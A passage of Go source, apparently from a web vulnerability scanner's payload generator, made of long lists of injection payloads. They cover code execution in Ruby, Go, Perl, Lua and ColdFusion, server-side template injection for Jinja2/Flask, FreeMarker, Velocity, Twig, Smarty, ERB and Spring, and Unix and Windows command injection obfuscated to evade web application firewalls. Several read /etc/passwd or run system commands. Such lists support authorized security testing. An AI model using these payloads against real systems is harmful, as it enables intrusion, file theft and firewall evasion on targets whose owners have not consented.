		{Content: "system('id')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby system - id", TechType: types.TechTypeRuby, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "`ls`", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby反引号执行", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "`whoami`", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby反引号 - whoami", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "`id`", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby反引号 - id", TechType: types.TechTypeRuby, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "exec('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby exec", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "IO.popen('ls').read()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby IO.popen", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "IO.popen('id').read()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby IO.popen - id", TechType: types.TechTypeRuby, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "Open3.popen3('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby Open3.popen3", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "%x{ls}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby %x执行", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "%x{id}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby %x - id", TechType: types.TechTypeRuby, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "eval('system(\"ls\")')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby eval执行", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "Process.spawn('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby Process.spawn", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "puts 'HAWKEYE_TEST_12345'", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby puts测试", TechType: types.TechTypeRuby, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
		{Content: "puts `id`", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby puts id", TechType: types.TechTypeRuby, ExpectedOutput: "uid=", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadGoPayloads() {
	pg.goCodeExecPayloads = []types.Payload{
		{Content: "exec.Command(\"ls\").Run()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Go exec.Command", TechType: types.TechTypeGo, IsHarmless: false},
		{Content: "exec.Command(\"whoami\").Run()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Go exec.Command - whoami", TechType: types.TechTypeGo, IsHarmless: false},
		{Content: "exec.Command(\"id\").Run()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Go exec.Command - id", TechType: types.TechTypeGo, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "exec.Command(\"sh\",\"-c\",\"ls\").Run()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Go exec.Command shell", TechType: types.TechTypeGo, IsHarmless: false},
		{Content: "syscall.Exec(\"/bin/ls\",[]string{\"ls\"},nil)", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "Go syscall.Exec", TechType: types.TechTypeGo, IsHarmless: false},
		{Content: "exec.Command(\"cmd\",\"/c\",\"dir\").Run()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "Go Windows exec", TechType: types.TechTypeGo, IsHarmless: false},
		{Content: "fmt.Println(\"HAWKEYE_TEST_12345\")", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Go fmt.Println测试", TechType: types.TechTypeGo, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadPerlPayloads() {
	pg.perlCodeExecPayloads = []types.Payload{
		{Content: "system('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl system", TechType: types.TechTypePerl, IsHarmless: false},
		{Content: "system('whoami')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl system - whoami", TechType: types.TechTypePerl, IsHarmless: false},
		{Content: "system('id')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl system - id", TechType: types.TechTypePerl, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "exec('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl exec", TechType: types.TechTypePerl, IsHarmless: false},
		{Content: "`ls`", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl反引号执行", TechType: types.TechTypePerl, IsHarmless: false},
		{Content: "`id`", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl反引号 - id", TechType: types.TechTypePerl, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "qx{ls}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl qx执行", TechType: types.TechTypePerl, IsHarmless: false},
		{Content: "qx{id}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl qx - id", TechType: types.TechTypePerl, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "open(F,'ls|')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl open管道", TechType: types.TechTypePerl, IsHarmless: false},
		{Content: "eval('system(\"ls\")')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl eval执行", TechType: types.TechTypePerl, IsHarmless: false},
		{Content: "do 'ls'", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl do执行", TechType: types.TechTypePerl, IsHarmless: false},
		{Content: "print \"HAWKEYE_TEST_12345\"", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl print测试", TechType: types.TechTypePerl, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
		{Content: "print `id`", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Perl print id", TechType: types.TechTypePerl, ExpectedOutput: "uid=", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadLuaPayloads() {
	pg.luaCodeExecPayloads = []types.Payload{
		{Content: "os.execute('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Lua os.execute", TechType: types.TechTypeLua, IsHarmless: false},
		{Content: "os.execute('whoami')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Lua os.execute - whoami", TechType: types.TechTypeLua, IsHarmless: false},
		{Content: "io.popen('ls'):read('*a')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Lua io.popen", TechType: types.TechTypeLua, IsHarmless: false},
		{Content: "io.popen('whoami'):read('*a')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Lua io.popen - whoami", TechType: types.TechTypeLua, IsHarmless: false},
		{Content: "load(os.execute('ls'))", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Lua load执行", TechType: types.TechTypeLua, IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadColdFusionPayloads() {
	pg.coldfusionCodeExecPayloads = []types.Payload{
		{Content: "<cfexecute name=\"ls\">", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "CF cfexecute", TechType: types.TechTypeColdFusion, IsHarmless: false},
		{Content: "<cfexecute name=\"cmd\" arguments=\"/c dir\">", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "CF cfexecute Windows", TechType: types.TechTypeColdFusion, IsHarmless: false},
		{Content: "<cfscript>executeCommand('ls')</cfscript>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "CF cfscript execute", TechType: types.TechTypeColdFusion, IsHarmless: false},
		{Content: "<cfobject type=\"COM\" class=\"WScript.Shell\">", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "CF COM对象", TechType: types.TechTypeColdFusion, IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadTemplatePayloads() {
	pg.templatePayloads = []types.Payload{
		{Content: "{{7*7}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI测试 - Jinja2/Twig", TechType: types.TechTypeTemplate, ExpectedOutput: "49", IsHarmless: false},
		{Content: "${7*7}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI测试 - FreeMarker", TechType: types.TechTypeTemplate, ExpectedOutput: "49", IsHarmless: false},
		{Content: "#{7*7}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI测试 - Ruby ERB", TechType: types.TechTypeTemplate, ExpectedOutput: "49", IsHarmless: false},
		{Content: "{{config}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Flask config", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{self.__class__.__mro__[1].__subclasses__()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Python subclasses", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "SSTI - 文件读取", TechType: types.TechTypeTemplate, ExpectedOutput: "root:", IsHarmless: false},
		{Content: "${\"freemarker.template.utility.Execute\"?new()(\"ls\")}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - FreeMarker执行", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"ls\")}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - FreeMarker assign", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Jinja2 os.popen", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "${T(java.lang.Runtime).getRuntime().exec('ls')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Spring Thymeleaf", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{''.__class__.__bases__[0].__subclasses__()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Jinja2 bases", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{request.__class__.__mro__[1].__subclasses__()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Jinja2 request", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Flask flashed", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Flask url_for", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Flask lipsum", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "{{cycler.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Flask cycler", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "{{joiner.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Flask joiner", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "{{namespace.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Flask namespace", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Flask config os", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "SSTI - file读取", TechType: types.TechTypeTemplate, ExpectedOutput: "root:", IsHarmless: false},
		{Content: "{{''.__class__.__bases__[0].__subclasses__()[137]('id',shell=True,stdout=-1).communicate()[0]}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - subprocess", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "{{''.__class__.__mro__[1].__subclasses__()[104]('cat /etc/passwd').read()}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "SSTI - os.popen", TechType: types.TechTypeTemplate, ExpectedOutput: "root:", IsHarmless: false},
		{Content: "{$smarty.version}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Smarty version", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{php}system('ls');{/php}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Smarty php", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{system('ls')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Smarty system", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{_self.env.display(\"id\")}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Twig display", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Twig exec", TechType: types.TechTypeTemplate, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('id'))##", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Velocity", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "#set($s=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Velocity inspect", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "<%= system('ls') %>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - ERB system", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "<%= `ls` %>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - ERB backtick", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "<%= IO.popen('ls').read() %>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - ERB IO.popen", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "${T(java.lang.Runtime).getRuntime().exec('id')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Spring EL id", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "#{T(java.lang.Runtime).getRuntime().exec('id')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Spring SpEL id", TechType: types.TechTypeTemplate, IsHarmless: false},
		{Content: "{{with $s := .Env}}{{range $k, $v := $s}}{{printf \"%s=%s\" $k $v}}{{end}}{{end}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "SSTI - Go template env", TechType: types.TechTypeTemplate, IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadWAFBypassPayloads() {
	pg.unixWAFBypassPayloads = []types.Payload{
		{Content: "; l''s;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 引号分割", IsHarmless: false},
		{Content: "; l\\s;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 反斜杠", IsHarmless: false},
		{Content: "; l$@s;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 特殊字符", IsHarmless: false},
		{Content: "; l$()s;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 空命令替换", IsHarmless: false},
		{Content: "; {ls,};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 大括号扩展", IsHarmless: false},
		{Content: "; l${PATH:0:0}s;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 变量切片", IsHarmless: false},
		{Content: "; l${IFS}s;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - IFS变量", IsHarmless: false},
		{Content: ";$(printf'\\x6c\\x73');", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - printf十六进制", IsHarmless: false},
		{Content: ";$(echo'bHM='|base64-d);", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - base64解码", IsHarmless: false},
		{Content: "; w${PATH:0:0}hoami;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - whoami变量切片", IsHarmless: false},
		{Content: "; {whoami,};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - whoami大括号", IsHarmless: false},
		{Content: "; wh\\oami;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - whoami反斜杠", IsHarmless: false},
		{Content: "; wh''oami;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - whoami引号", IsHarmless: false},
		{Content: "%0als", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 换行符URL编码", IsHarmless: false},
		{Content: "%0awhoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - whoami换行编码", IsHarmless: false},
		{Content: ";${IFS}ls${IFS}-la;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - IFS空格替换", ExpectedOutput: "total", IsHarmless: false},
		{Content: "; /???/??t /???/p??s??;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 通配符cat", ExpectedOutput: "root:", IsHarmless: false},
		{Content: "; /bin/c[a]t /etc/p[a]sswd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 中括号通配符", ExpectedOutput: "root:", IsHarmless: false},
		{Content: "; c'a't /e'tc'/p'a'sswd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - cat引号分割", ExpectedOutput: "root:", IsHarmless: false},
		{Content: "; c\\at /e\\tc/p\\asswd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - cat反斜杠", ExpectedOutput: "root:", IsHarmless: false},
		{Content: ";{id,};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - id大括号", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "; i''d;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - id引号分割", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "; i\\d;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - id反斜杠", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "%0aid", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - id换行编码", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: ";{cat,/etc/passwd};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - cat大括号参数", ExpectedOutput: "root:", IsHarmless: false},
		{Content: ";$(printf'\\x63\\x61\\x74'/etc/passwd);", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - cat十六进制", ExpectedOutput: "root:", IsHarmless: false},
		{Content: ";$'\\x6c\\x73';", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - ANSI-C引号", IsHarmless: false},
		{Content: ";$(echo'L2Jpbi9scw=='|base64-d);", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 路径base64", IsHarmless: false},
		{Content: ";`echo'bHM='|base64-d`;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 反引号base64", IsHarmless: false},
		{Content: ";$((echo ls));", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 算术扩展", IsHarmless: false},
		{Content: "; x=$'ls';$x;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 变量赋值", IsHarmless: false},
		{Content: ";$(printf'%s\\n'ls|sh);", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - printf管道", IsHarmless: false},
		{Content: "; a=l;b=s;$a$b;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 变量拼接", IsHarmless: false},
		{Content: "; $(printf'\\154\\163');", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 八进制", IsHarmless: false},
		{Content: "; $(printf'\\x6c\\x73');", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 十六进制2", IsHarmless: false},
		{Content: "; {`ls`};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 大括号反引号", IsHarmless: false},
		{Content: "\nls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 换行符", IsHarmless: false},
		{Content: "\rls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 回车符", IsHarmless: false},
		{Content: "\tls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 制表符", IsHarmless: false},
		{Content: ";`ls`;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 反引号执行", IsHarmless: false},
		{Content: ";$(ls);", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - $()执行", IsHarmless: false},
		{Content: ";`id`;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - id反引号", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: ";$(id);", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - id $()", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "|`ls`", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 管道反引号", IsHarmless: false},
		{Content: "|$(ls)", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 管道$()", IsHarmless: false},
		{Content: "||`ls`", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - OR反引号", IsHarmless: false},
		{Content: "&&`ls`", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - AND反引号", IsHarmless: false},
		{Content: ";${IFS}id;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - IFS id", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: ";{id};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 大括号id", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: ";$'id';", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - ANSI-C id", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: ";`w${PATH:0:0}hoami`;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 变量切片反引号", IsHarmless: false},
		{Content: "; {/???/??t${IFS}/???/p??s??};", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - 通配符IFS", ExpectedOutput: "root:", IsHarmless: false},
		{Content: "; .${IFS}/etc/passwd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - source IFS", ExpectedOutput: "root:", IsHarmless: false},
		{Content: "; source${IFS}/etc/passwd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "WAF绕过 - source命令", ExpectedOutput: "root:", IsHarmless: false},
	}

	pg.windowsWAFBypassPayloads = []types.Payload{
		{Content: "& d^ir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - Windows脱字符", IsHarmless: false},
		{Content: "& w^hoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - whoami脱字符", IsHarmless: false},
		{Content: "& di''r", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - Windows引号", IsHarmless: false},
		{Content: "& who''ami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - whoami引号", IsHarmless: false},
		{Content: "& set /a=dir&call %a%", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - 变量调用", IsHarmless: false},
		{Content: "& for /f \"delims=\" %a in ('cmd /c echo dir') do %a", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - for循环", IsHarmless: false},
		{Content: "& c^m^d /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - cmd脱字符", IsHarmless: false},
		{Content: "& p^o^w^e^r^s^h^e^l^l dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - powershell脱字符", IsHarmless: false},
		{Content: "& c\"\"md /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - 双引号分割", IsHarmless: false},
		{Content: "& %COMSPEC% /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - COMSPEC变量", IsHarmless: false},
		{Content: "& %WINDIR%\\system32\\cmd.exe /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - 完整路径", IsHarmless: false},
		{Content: "& powershell -enc ZABpAHIA", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - PowerShell Base64", IsHarmless: false},
		{Content: "& cmd /c \"set p=dir&&call %%p%%\"", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - set变量执行", IsHarmless: false},
		{Content: "& w\"\"hoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - whoami双引号", IsHarmless: false},
		{Content: "& d^^ir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - 双重脱字符", IsHarmless: false},
		{Content: "& d^i^r", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - 字符脱字符", IsHarmless: false},
		{Content: "& w^h^o^a^m^i", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - whoami全脱字符", IsHarmless: false},
		{Content: "& c\"m\"d /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - cmd双引号", IsHarmless: false},
